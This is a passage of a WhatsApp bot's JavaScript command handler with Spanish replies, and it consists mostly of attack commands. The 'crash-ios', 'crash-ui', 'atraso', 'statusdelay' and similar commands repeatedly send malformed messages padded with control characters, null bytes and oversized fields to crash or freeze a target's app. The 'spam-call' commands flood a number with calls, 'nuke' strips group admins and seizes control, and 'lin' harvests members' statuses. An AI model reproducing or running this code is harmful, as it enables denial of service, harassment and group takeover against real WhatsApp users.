await sleep(5000)
ZieeInvisForceIOS(conn, target)
await sleep(5000)
ZieeInvisForceIOS(conn, target)
await sleep(5000)
ZieeInvisForceIOS(conn, target)

}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
case "xhgr2":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let r = 0; r < 666; r++) {
await IosInvisibleForce(conn, target)
await new Promise(resolve => setTimeout(resolve, 500));
}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
  case "good":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 4; i++) {
CtaZts(conn, target)
await sleep(5000)
handleSzt(conn, target) 
}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
// Dentro de tu switch de comandos
case 'new':{
await conn.relayMessage(from, {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "\u0003".repeat(200000) },
nativeFlowMessage: {
messageParamsJson: JSON.stringify({
payment_currency: "BTC",
payment_amount: 0
})
}
}
}
}
}, {});
}                    
break

case 'andro-ios':{
if (!isBot && !isCreator) return
const img = {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c&mms3=true",
mimetype: "image/jpeg",
fileSha256: Buffer.from("i4ZgOwy4PHQmtxW+VgKPJ0LEE9i7XfAwJYk4DVKnjB4=", "base64"),
fileLength: "62265",
height: 1080,
width: 1080,
mediaKey: Buffer.from("qaiU0wrsmuE9outTy1QEV8TnPwlNAFS5kqmTLBXBugM=", "base64"),
fileEncSha256: Buffer.from("Vw0MGUhP27kXt9W4LxnpzzYGrozU8pbzafHsxoegPq8=", "base64"),
    directPath: "/o1/v/t24/f2/m239/AQMDTeV5_VA-OBFSuqdqXYX0-53ZJQHkoQR944ZaGcoo_GA4-3_-FypseU9Bi7f5ORRn-BQYL8vbFpfXOmxRdLVz8FkzxTf3SyA11Biz3Q?ccb=9-4&oh=01_Q5Aa2QFfCY7O3IquSb0Fvub083w1zLcGVzWCk-P1hjnUMKeSxQ&oe=68DA0F65&_nc_sid=e6ed6c",
    mediaKeyTimestamp: "1756530813",
    jpegThumbnail: Buffer.from(
      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAgMBAAAAAAAAAAAAAAAAAQMCBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADzuFlZHovO7xOj1uUREwAX0yI6XNtOxw93RIABlmFk6+5OmVN9pzsLte4BLKwZYjr6GuJgAAAAJBaD/8QAJhAAAgIBAgQHAQAAAAAAAAAAAQIAAxEQEgQgITEFExQiMkFhQP/aAAgBAQABPwABSpJOvhZwk8RIPFvy2KEfAh0Bfy0RSf2ekqKZL+6ONrEcl777CdeFYDIznIjrUF3mN1J5AQIdKX2ODOId9gIPQ8qLuOI9TJieQMd4KF+2+pYu6tK8/GenGO8eoqQJ0x+6Y2EGWWl8QMQQYrpZ2QZljV4A2e4nqRLaUKDb0jhE7EltS+RqrFTkSx+HrSsrgkjrH4hmhOf4xABP/8QAGBEAAwEBAAAAAAAAAAAAAAAAAREwUQD/2gAIAQIBAT8AmjvI7X//xAAbEQAABwEAAAAAAAAAAAAAAAAAAQIREjBSIf/aAAgBAwEBPwCuSMCSMA2fln//2Q==",
      "base64"
    ),
    contextInfo: {},
    scansSidecar: "lPDK+lpgZstxxk05zbcPVMVPlj+Xbmqe2tE9SKk+rOSLSXfImdNthg==",
    scanLengths: [7808, 22667, 9636, 22154],
    midQualityFileSha256: "kCJoJE5LX9w/KxdIQQgGtkQjP5ogRE6HWkAHRkBWHWQ="
  };
  
for (let i = 0; i < 15; i++) {
const cards = [
{
header: {
hasMediaAttachment: true,
imageMessage: img,
title: "\u2060".repeat(3000) + "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\n" + i },
body: { text: "ꦾ".repeat(9999) },
footer: { text: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏" + i },
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "single_select",
buttonParamsJson: "\u0000".repeat(1000)
},
{
name: "cta_copy",
buttonParamsJson: "{\"copy_code\":\"62222222\",\"expiry\":1692375600000}"
            },
            {
              name: "cta_url",
              buttonParamsJson: "{\"display_text\":\"VIEW\",\"url\":\"https://example.com\"}"
            },
            {
              name: "galaxy_message",
              buttonParamsJson: "{\"icon\":\"REVIEW\",\"flow_cta\":\"\\u0000\",\"flow_message_version\":\"3\"}"
            },
            {
              name: "payment_info",
              buttonParamsJson: "{\"reference_id\":\"Flows\",\"amount\":50000,\"currency\":\"IDR\"}"
            },
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`
},
{
name: "payment_method",
buttonParamsJson:
"{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\",\"type\":\"𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
            }
          ]
        }
      }
    ];

const msg = generateWAMessageFromContent(
from,
{
viewOnceMessage: {
message: {
messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
interactiveMessage: {
body: { text: "ꦾ".repeat(9999) },
footer: { text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" },
header: { hasMediaAttachment: true, imageMessage: img },
carouselMessage: { cards }
},
contextInfo: {
remoteJid: "30748291653858@lid",
participant: "0@s.whatsapp.net",
mentionedJid: ["0@s.whatsapp.net"],
urlTrackingMap: {
urlTrackingMapElements: [
{
originalUrl: "https://youtube.com/xnxx",
unconsentedUsersUrl: "https://youtube.com/@xnnxx",
consentedUsersUrl: "https://youtube.com/@xnnxx",
cardIndex: 1
},
{
originalUrl: "https://youtube.com/@xnnxx",
unconsentedUsersUrl: "https://youtube.com/@xnnxx",
consentedUsersUrl: "https://youtube.com/@xnnxx",
cardIndex: 2
                  }
                ]
              },
quotedMessage: {
paymentInviteMessage: {
serviceType: 3,
expiryTimestamp: Date.now() + 1814400000
                }
              }
            }
          }
        }
      },
      {}
    );

await conn.relayMessage(from, msg.message, { messageId: msg.key.id });
    await new Promise(res => setTimeout(res, 500));
  }

for (let i = 0; i < 15; i++) {
const msg2 = {
extendedTextMessage: {
text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\n" + "𑇂𑆵𑆴𑆿".repeat(60000),
contextInfo: {
fromMe: false,
stanzaId: from,
participant: from,
quotedMessage: {
conversation: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>" + "𑇂𑆵𑆴𑆿".repeat(9000)
        },
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING"
}
},
inviteLinkGroupTypeV2: "DEFAULT"
    }
  };

await conn.relayMessage(
from,
msg2,
{ ephemeralExpiration: 5, timeStamp: Date.now() },
{ messageId: null }
  );

const msg3 = await generateWAMessageFromContent(
from,
{
extendedTextMessage: {
text: "Xghr-BOT V2",
matchedText: "https://wa.me/593KKK?s=5",
description: "👥️" + "𑇂𑆵𑆴𑆿".repeat(15000),
title: "Xghr-BOT V2" + "𑇂𑆵𑆴𑆿".repeat(15000),
previewType: "NONE",
jpegThumbnail: fs.readFileSync ('./media/thumb.jpg'),
inviteLinkGroupTypeV2: "DEFAULT"
}
},
{ ephemeralExpiration: 5, timeStamp: Date.now() }
  );

await conn.relayMessage(from, msg3.message, { messageId: msg3.key.id });
}
}
break
case "crash-ios3":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo\n ${prefix + command} +593xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 10; i++) {
await loadedXios(target);
await loadedXios(target);
await loadedXios(target);
await loadedXios(target);
await loadedXios(target);
await loadedXios(target);
await loadedXios(target)
}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
case "crash-ios2":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo\n ${prefix + command} +52xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 10; i++) {
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target);
await forcepotter(target)
}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
case "crash-ios4":
if (!isBot && !isCreator) return
if (!q) return reply(`Ejemplo ${prefix + command} +52xxx`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 10; i++) {
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target);
await crashGalaxy(target)
}
conn.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
break
case 'spam-call': {
   if (!isBot && !isCreator) return
    if (!q) return reply(`Formato incorrecto. Ejemplo:\n${prefix + command} 543xxx,<cantidad>`);

    let targetNumber;
    let cantidad = 1;

    if (q.includes(',')) {
        const parts = q.split(',');
        targetNumber = parts[0].replace(/[^0-9]/g, '');
        const requestedCantidad = parseInt(parts[1].trim(), 10);
        
        if (!isNaN(requestedCantidad) && requestedCantidad > 0) {
            cantidad = Math.min(requestedCantidad, 10);
        }
    } else {
        targetNumber = q.replace(/[^0-9]/g, '');
    }

    if (!targetNumber) return reply('Número no válido.');

    const target = targetNumber + "@s.whatsapp.net";

    try {
        // 1. Enviamos y guardamos el mensaje inicial
        const sentMsg = await conn.sendMessage(from, {
            text: `> Iniciando ${cantidad} llamadas a ${target.split('@')[0]}...`
        }, { quoted: m });

        for (let i = 0; i < cantidad; i++) {
            await conn.offerCall(target);
            console.log(`Llamada de voz #${i + 1} ofrecida a ${target}`);
            if (cantidad > 1) {
                await sleep(5000);
            }
        }

        // 2. Editamos el mensaje original al finalizar
        await conn.sendMessage(from, {
            text: `> Se completo ${cantidad} llamada a ${target.split('@')[0]}.`,
            edit: sentMsg.key
        });

    } catch (error) {
        console.error(`Error al ofrecer llamada:`, error);
        reply(`Error`);
    }
    break;
}
case 'spam-videocall': {
    if (!isCreator) return reply('Este comando es solo para el creador.');
    if (!q) return reply(`Formato incorrecto. Ejemplo:\n${prefix + command} 549xxx,<cantidad>`);

    let targetNumber;
    let cantidad = 1;

    if (q.includes(',')) {
        const parts = q.split(',');
        targetNumber = parts[0].replace(/[^0-9]/g, '');
        const requestedCantidad = parseInt(parts[1].trim(), 10);

        if (!isNaN(requestedCantidad) && requestedCantidad > 0) {
            cantidad = Math.min(requestedCantidad, 10);
        }
    } else {
        targetNumber = q.replace(/[^0-9]/g, '');
    }
    
    if (!targetNumber) return reply('Número no válido.');

    const target = targetNumber + "@s.whatsapp.net";

    try {
        // 1. Enviamos y guardamos el mensaje inicial
        const sentMsg = await conn.sendMessage(from, {
            text: `> Iniciando ${cantidad} videollamada a ${target.split('@')[0]}...`
        }, { quoted: m });

        for (let i = 0; i < cantidad; i++) {
            await conn.offerCall(target, { video: true });
            console.log(`Videollamada #${i + 1} ofrecida a ${target}`);
            if (cantidad > 1) {
                await sleep(5000);
            }
        }

        // 2. Editamos el mensaje original al finalizar
        await conn.sendMessage(from, {
            text: `> Se completo ${cantidad} videollamadas a ${target.split('@')[0]}.`,
            edit: sentMsg.key
        });

    } catch (error) {
        console.error(`Error al ofrecer videollamada:`, error);
        reply(`Error`);
    }
    break;
}
case 'crash-button':
for (let i = 0; i < 20; i++) {
await conn.sendMessage(from, {
document: {
url: "./travas/crash.zip"
},
fileName: '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘',
caption: '@𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + "ꦿꦶꦷꦹꦽ".repeat(9999),
mimetype: "@".repeat(9999),
contextInfo: {
"externalAdReply": {
"title": '',
"body": '@Xghr-BOT V2',
"mediaType": 2,
"thumbnail": fs.readFileSync('./media/ola.jpg'),
"jpegThumbnail": fs.readFileSync("./media/ola.jpg"),
"firstImageId": 99999999,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/@sekzope'
}
},
mentions: [m.sender],
footer: "Xghr-BOT V2",
buttons: [
{
buttonId: "hi",
buttonText: {
displayText: travadoc
}
},
{
buttonId: "hi2",
buttonText: {
displayText: travadoc
}
},
{
buttonId: "hi3",
buttonText: {
displayText: travadoc
}
}],
viewOnce: true,
headerType: "DOCUMENT",
}, {})
}
break
case 'crash-ui':
if (!isBot && !isCreator) return
for (let i = 0; i < 30; i++) {
await conn.relayMessage(from, 
{
locationMessage: {
degreesLongitude: 0,
degreesLatitude: 0,
name: "Xghr-BOT V2" + "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
url: "https://xnxx." +  "ꦿꦹꦸꦽꦶꦷ".repeat(9000) + ".id", 
address:  "Xghr-BOT V2" + "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true, 
showAdAttribution: true, 
body:  "☠️ • 𝐂𝐫𝐚𝐬𝐡 𝐔𝐢?", 
title: "ꦿꦹꦸꦽꦶꦷ".repeat(9000), 
sourceUrl: "https://xnxx." +  "ꦽ".repeat(9000) + ".id",  
thumbnail:fs.readFileSync ("./media/thumb.jpg"), 
quotedAd: {
advertiserName: "ꦽ".repeat(9000), 
mediaType: 2,
jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
caption: "Xghr-BOT V2", 
}, 
pleaceKeyHolder: {
remoteJid: "0@s.whatsapp.net", 
fromMe: false, 
id: "ABCD1234567"
}
}
}
}
}, 
{});
}
break
case "canal-ios":{
if (!isBot && !isCreator) return
await conn.relayMessage(from, {
'newsletterAdminInviteMessage': {
'newsletterJid': '120363282786345717@newsletter',
'newsletterName': '𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘' + ios6,
'jpegThumbnail': '',
'caption': "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
'inviteExpiration': "99999999999"
}
}, { 'quoted': info });
conn.relayMessage(from, {
'extendedTextMessage': {
'text': "𝐵𝑂𝑇 𝑉𝐼𝑃"
}
}, {});
}
break;
case 'convite':{
if (!isBot && !isCreator) return;
await conn.relayMessage(from, {'groupInviteMessage': {'groupName': ' • 𝐂𝐫𝐚𝐬𝐡 𝐤𝐤𝐤𝐤𝐣𝐔' ,'groupJid': '6285709664923-1627579259@g.us','inviteCode': 'h+64P9RhJDzgXSPf','inviteExpiration': '999','caption': '𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏','contextInfo': {'fromMe': false,'participant': '0@s.whatsapp.net','remoteJid': sender,'quotedMessage': { 'listResponseMessage': { 'title': `☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </> ${ios6}` }}}}},{});
}
conn.relayMessage(from,{extendedTextMessage: {text: `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`}},{})
break;
case "crash-ios":
if (!isBot && !isCreator) return;
for (let i = 0; i < 30; i++) {
conn.relayMessage(from, {
contactMessage: {
displayName: "Xghr-BOT V2" + ios6,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏\nFN:🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>\nitem1.TEL;waid=69696969696969:69696969696969\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:YT: https://youtube.com/@p.a.zinwebkkkkj\nitem2.X-ABLabel:YouTube\nitem3.URL:INSTA: instagram.com/web_retired\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Brasil, AM, SP;;;;\nitem4.X-ABLabel:Region\nEND:VCARD",
contextInfo: {
forwardingScore: 2,
isForwarded: true,
isFromMe: true,
externalAdreply: {
mediaType: 1,
previewType: "NONE",
sourceUrl: `https://xnnx.com`,
}            
}
}
},
{
quoted: info
}
)
}
break
case 'atraso': 
  if (!isBot && !isCreator) return
  conn.sendMessage(m.chat, { react: { text: '⏳️', key: m.key } })

  const imagePath = './media/ola.jpg'
  const url = 'https://chat.whatsapp.com/PENE'
  const title = `\n${url}\n`
  const button = {
    name: "cta_url",
    buttonParamsJson: JSON.stringify({
      display_text: '',
      url,
      merchant_url: url
    })
  }

  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer })
  const header = proto.Message.InteractiveMessage.Header.create({
    ...media,
    title,
    gifPlayback: true,
    subtitle: " ",
    hasMediaAttachment: false
  })

  const cardTemplate = {
    header,
    body: { text: "🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛" },
    nativeFlowMessage: { buttons: [button] }
  }

  const cards = Array(25).fill(cardTemplate) // Puedes ajustar la cantidad aquí

  for (let i = 0; i < 30; i++) {
    await conn.relayMessage(from, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: '🎠𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛' + "\0\0\0\0\0\0\0\0\0".repeat(0x1869f) },
            carouselMessage: { cards }
          }
        }
      }
    }, { participant: { jid: from } })
  }

  conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  break


case "statusbox": 
  try {
    await handleStatusBox(conn, m); 
  } catch (e) {
  }
  break;
case 'button':
if (!isBot && !isCreator) return
if (m.isGroup && groupid.includes(m.chat)) {
    return reply("❎❎❎❎");
}
await conn.sendMessage(from, {
image: { url: './src/foto.jpg' },
"contextInfo": {
  "externalAdReply": {
    "title": `𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘`,
    "body": 'ola',
    "mediaType": 4,
    "thumbnail": web,
"jpegThumbnail": web,
    "MediaUrl": 'SEKKKK',
    "sourceUrl": 'KKKK'
  }
},
caption: `☠️⃟⿻Xghr ϟ 𝐕𝟒⿻⃟☠️`,
footer: `𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 & 𝐌𝐚𝐢𝐤𝐞𝐥`,
buttons: [
  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100) }, type: 10 },
  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
{ buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
  { buttonId: '\u0000'.repeat(100), buttonText: { displayText: sekzo3 + '\u0000'.repeat(100)}, type: 10 },
],

headerType: 1,
viewOnce: true
});
break; 
case "atraso-package": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    let xgr = 5;  
    for (let i = 0; i < xgr; i++) {
        blenklet(conn, target)
    }

    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'statusdelay':
if (!isBot && !isCreator) return
conn.sendMessage(m.chat, {react: {text: '⏳️', key: m.key}})
for (let i = 0; i < 800; i++) {
  let msg = await generateWAMessageFromContent(from, {
buttonsMessage: {
text: "☕️ 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛 </>",
contentText: "𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 ⚡️",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘" + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});
  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [from],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: from },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (isCreator) {
    await conn.relayMessage(
      from,
      {
groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
additionalNodes: [
{
tag: "meta",
attrs: {
is_status_mention: "𝕮𝖍𝖔𝖈𝖔𝖕𝖑𝖚𝖘",
},
content: undefined,
},
],
}
);
}
}
conn.sendMessage(m.chat, {react: {text: '✅️', key: m.key}})
break

case "crash-chat": {
    if (!isBot && !isCreator) return;
  for (let i = 0; i < 3; i++) {
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    await sleep(8000)
    yangBacaDev2(conn, from)
    
    }
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
    
}
break;

case 'play': {
    if (!q) return reply('`Ingresa el nombre de la canción`');
    
    try {
        // 1. OBTENER INFO Y AUDIO URL DE LA API
        const apiUrl = `https://api.nexfuture.com.br/api/downloads/youtube/play?query=${encodeURIComponent(q)}`;
        const response = await fetch(apiUrl);
        if (!response.ok) throw new Error(`La API de música falló: ${response.status}`);
        
        const songData = await response.json();
        if (!songData.status || !songData.resultado) return reply('No se encontraron resultados para esa canción.');
        
        const { imagem, titulo, desc, tempo, views, audio: audioUrl } = songData.resultado;
        const caption = `> *Título:* ${titulo}\n> *Duración:* ${tempo}\n> *Vistas:* ${views}\n\n\`_Procesando audio en el búnker..._\``;
        
        await conn.sendMessage(from, { 
            image: { url: imagem }, 
            caption 
        }, { quoted: m });

        // 2. DELEGAR LA CONVERSIÓN AL MICROSERVICIO (CERO BLOQUEO)
        const conversionResponse = await fetch('http://localhost:3000/convert', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ audioUrl: audioUrl, title: titulo })
        });

        if (!conversionResponse.ok) {
            console.error('El servicio de conversión devolvió un error:', await conversionResponse.text());
            throw new Error('El búnker de conversión falló.');
        }

        const opusBuffer = await conversionResponse.buffer();

        // 3. ENVIAR EL RESULTADO FINAL
        await conn.sendMessage(from, { 
            audio: opusBuffer, 
            mimetype: 'audio/ogg; codecs=opus', 
            ptt: false
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply(`Error al procesar la canción.`);
    }
}
break;
case 'nuke': {

  if (!isBot) return 
  if (!m.isGroup) return
  try {
    
    const metadata = await conn.groupMetadata(from);
    const parts = metadata.participants || [];
    const admins = parts.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.id);
    if (admins.length === 0) {
      await conn.sendMessage(from, { text: 'Não' }, { quoted: m });
      break;
    }
    for (let adm of admins) {
      if (adm === sender) continue;
      if (adm === botNumber) continue;
      try {
        await conn.groupParticipantsUpdate(from, [adm], 'demote');
        await sleep(300); 
      } catch (e) {
      }
    }
    try {
      await conn.groupParticipantsUpdate(from, [sender], 'promote');
    } catch (e) {
  
    }

    await conn.sendMessage(from, { text: '✅' }, { quoted: m });

  } catch (err) {
    console.error(err);
  }
}
  break;

case 'tt':
case 'tiktok': {
    if (!q) return reply('*Ingresa el enlace del video de tiktok');
    try {
        const apiUrl = `https://api.dorratz.com/v2/tiktok-dl?url=${encodeURIComponent(q)}`;
        const noze = await fetch(apiUrl);
        if (!noze.ok) throw new Error(`Error API ${noze.status}`);
        const json = await noze.json();
        if (!json.status || !json.data) return reply('No se encontró el video.');
        const { title, duration, repro, like, share, comment, author, music, media } = json.data;
        const caption = `
> *Título:* \`${title}\`
> *Autor:* ${author.nickname} (${author.username})
> *Música:* ${music.title}
> *Duración:* ${duration}s
> *Reproducciones:* ${repro}
> *Likes:* ${like}
> *Comentarios:* ${comment}
> *Compartidos:* ${share}
        `;
const urlx = media.hd || media.org;
await conn.sendMessage(from, { 
    video: { url: urlx }, 
       caption: caption.trim()
        }, { quoted: m });

    } catch (err) {
        console.error(err);
        reply('Error');
    }
}
break;

case "home-ios": {
    if (!isBot && !isCreator) return;

    let pelaku = m.mentionedJid && m.mentionedJid.length > 0
        ? m.mentionedJid[0]
        : m.quoted
            ? m.quoted.sender
            : (q ? q.replace(/[^0-9]/g, '') : null);

    if (!pelaku) return reply(" Ingresa un número válido.");

    let target = pelaku.includes('@s.whatsapp.net') ? pelaku : pelaku + "@s.whatsapp.net";
    if (candList.includes(target)) {
        //kkkkk
        await conn.sendMessage(m.chat, { 
            text: `Nel, con el owner no ` 
        }, { quoted: m });
        await conn.sendMessage("593969533280@s.whatsapp.net", { 
            text: `User *${m.sender}* intentó follar a ${target}.`
        });
        return;
    }
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    await sleep(3000)
    crashiOS(target)
    conn.sendMessage(m.chat, { react: { text: '✅', key: m.key }});
}
break;
case 'catalogo-ios':{
if (!isBot && !isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/ola.jpg') }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(from, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": "🎠" + cataui,
"description": cataui,
"currencyCode": `BRL`,
"footerText": cataui,
"priceAmount1000": "1000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000000000",
"retailerId": ` `,
"url": "wa.me/9473839229292"
},
"businessOwnerJid": "526421147692@s.whatsapp.net",
}
}), { userJid: from })
conn.relayMessage(from, catalog.message, { messageId: catalog.key.id })
}
break 


case "lin":
if (!isBot && !isCreator) return
    {
      let resultText = "Infos:\n";
      if (m.isGroup) {
        for (const jid of participants) {
          await sleep(1000);
          let res = await conn.fetchStatus(jid.jid);
          let status = res[0]?.status.status || "";
          let setAt = res[0]?.status.setAt || "";
          let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
          await sleep(1000);
        }
        await conn.sendMessage(from, { text: resultText });
      } else {
        let res = await conn.fetchStatus(from);
        console.log(res);
        let status = res[0]?.status.status || "";
        let setAt = res[0]?.status.setAt || "";
        let id = res[0]?.id || "";
        resultText += `Id: *${id}*\nStatus: *${status}*\nTime: *${setAt}*\n---------------------------\n`;
        await conn.sendMessage(from, { text: resultText });
      }
    }
    break;

case 'tag': {
if (!isBot && !isCreator) return;
    if (!m.isGroup) return reply("Este comando solo funciona en grupos")
    
    let metadata = await conn.groupMetadata(m.chat)
    let participantes = metadata.participants.map(u => u.id)

    await conn.sendMessage(m.chat, {
        text: "",
        mentions: participantes
    }, { quoted: m.quoted ? m.quoted : info })
}
break
    case 'menu':
    if (!isBot && !isCreator) return 

    const os = require('os');
    const moment = require('moment-timezone');
    
    var deviceType = m.key.id.length > 21 ? 'Android' : m.key.id.substring(0, 2) == '3A' ? 'IPhone' : 'WhatsApp Web';
    const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
    const data = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

  const menuzz = fs.readFileSync('./src/thumb.jpg');

    await conn.sendMessage(from, {
        image: { url: './src/foto.jpg' },
        contextInfo: {
            externalAdReply: {
                title: `𝐏.𝑐ℎ𝑜𝑐𝑜𝑐𝑟𝑖𝑠𝑝𝑦`,
                body: `𝐵𝑂𝑇 𝑉𝐼𝑃`,
                mediaType: 4,
                thumbnail: menuzz,
                jpegThumbnail: menuzz,
                mediaUrl: 'KKKKK',
                sourceUrl: 'KKKK'
            }
        },
        caption: `
╭⪫═════════════════⪫
│  𝐵𝑂𝑇 𝑉𝐼𝑃
│  \`Usuario\`: ${pushname}
